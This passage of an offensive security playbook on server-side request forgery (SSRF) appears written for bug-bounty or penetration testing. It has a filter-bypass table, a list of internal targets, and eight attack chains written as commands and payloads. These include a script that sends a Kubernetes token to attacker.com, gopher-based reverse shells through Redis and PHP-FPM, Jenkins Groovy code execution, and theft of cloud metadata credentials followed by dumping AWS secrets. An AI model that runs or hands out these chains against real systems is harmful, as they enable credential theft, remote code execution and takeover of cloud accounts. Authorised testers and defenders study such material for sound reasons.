    (Docker API, Consul, WebLogic, Solr) are exploitable and what payload to send.
    Generic SSRF reports are triaged as informational; SSRF + RCE chain = critical.

---

## Bypass Matrix

| Filter Type | Best Bypass | Notes |
|-------------|-------------|-------|
| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on allowlisted domain | URL parser confusion |
| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
| IMDSv2 required | HTTP 307 redirect preserving PUT method | Re-sends PUT to IMDS from app |
| String-based host allowlist | `127.0.0.1.nip.io` or `localtest.me` | Static DNS resolution bypass |
| URL validates on domain only | XSLT `document()` or XXE entity in XML body | Bypasses URL-param filter entirely |
| Port filter (numeric check) | `localhost:+11211aaa` or `localhost:00011211` | Malformed port string normalization |

---

## High-Value Targets

| Target Stack / Feature | Why High Value | Impact |
|-----------------------|----------------|--------|
| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
| XML parsers with `xs:import`, XSLT `document()`, XXE | URL fetched during parsing | SSRF bypassing URL-parameter filters |
| SAML assertions with external entities | XML parser resolves DTD externals | XXE → SSRF to internal services |
| SVG upload with server-side rendering | SVG is XML; external entities trigger fetches | Blind SSRF via file upload |
| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
| FastCGI at `127.0.0.1:9000` | PHP-FPM default; accepts PHP_VALUE injection | gopher → PHP RCE |
| Docker API at `127.0.0.1:2375` | Unauthenticated daemon in dev/CI environments | Container create → host FS RCE |
| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
| Atlassian Jira/Confluence (CVE-2017-9506) | OAuth icon-uri endpoint — no auth needed | Full read-SSRF with response body |
| Java RMI ports (1099, 8999-9010) | Deserialization without auth | gopher → RCE via gadget chains |

---

## Real-World Chains

### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil

```
1. App allows user to configure webhook URL
2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Trigger the webhook (submit a form, create a resource, etc.)
4. Response contains role name → fetch credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.

Impact: Critical — full AWS account access
Real example: Capital One breach (2019), GitLab HackerOne report #1116226
```

### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover

```
1. App has HTML-to-PDF feature (report generation, invoice download)
2. Inject iframe or fetch in HTML template:
   <script>
   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
     .then(r=>r.text())
     .then(t=>fetch('https://attacker.com/token?t='+t))
   </script>
3. PDF service renders HTML in headless browser inside K8s pod
4. Service account token exfilled to attacker
5. Use token with K8s API:
   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens

Impact: Critical — full K8s cluster secret access
```

### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell

```
1. Find SSRF in imageUrl parameter
2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
3. Generate cron-based reverse shell via Gopherus:
   python3 gopherus.py --exploit redis
   → select cronjob → enter reverse shell → copy gopher:// payload
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
5. Cron executes → reverse shell on port 4444

Impact: Critical — RCE on server
```

### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE

```
1. Blind SSRF confirmed via OOB DNS callback
2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
4. POST to /script:
   script=def+cmd="id".execute();def+out=new+StringBuffer();
   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
5. Response contains command output

Impact: Critical — RCE via internal Jenkins
```

### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot

```
1. SSRF in containerized app (ECS Fargate)
2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
4. Assume role with trust policy:
   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
5. Pivot to a different AWS account in the organization

Impact: Critical — cross-account AWS access
```

### Chain 6: XSLT Document Import → SSRF → Cloud Metadata

```
1. Find a feature accepting XSL stylesheets (report builder, data transformer, SOAP endpoint)
2. Craft XSLT with document() fetching IMDS:
   <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
3. Upload/submit stylesheet — server's XSLT engine fetches the URL during transform
4. Response contains IAM role name → second request for credentials
5. Exfil AccessKeyId + SecretAccessKey + SessionToken

Impact: Critical — URL-parameter filters completely bypassed; SSRF via XML body
```

### Chain 7: SSRF → FastCGI Gopher → PHP RCE

```
1. Confirm SSRF in any parameter (blind is fine — gopher:// gets no response anyway)
2. Probe port 9000: gopher://127.0.0.1:9000/ — timing difference confirms PHP-FPM
3. Generate FastCGI payload via Gopherus:
   python3 gopherus.py --exploit fastcgi
   → enter existing PHP file path (e.g., /var/www/html/index.php)
   → enter reverse shell command
4. Send gopher:// payload via SSRF parameter
5. PHP-FPM executes: auto_prepend_file = php://input → bash reverse shell

Impact: Critical — RCE via internal PHP-FPM; works even without Redis/no-auth services
```

### Chain 8: Internal Jira CVE-2017-9506 → SSRF → IMDS Credential Theft

```
1. During recon, find internal Jira instance (common in enterprise environments)
2. Test CVE-2017-9506 (no auth required):
   GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Response body contains IAM role name → fetch full credentials:
   GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
4. Get AccessKeyId + SecretAccessKey + SessionToken
5. Pivot to AWS: aws s3 ls, aws secretsmanager list-secrets

Impact: Critical — unauthenticated SSRF via internal enterprise tooling
Note: Works even when the SSRF target has no direct user-facing SSRF parameter
```
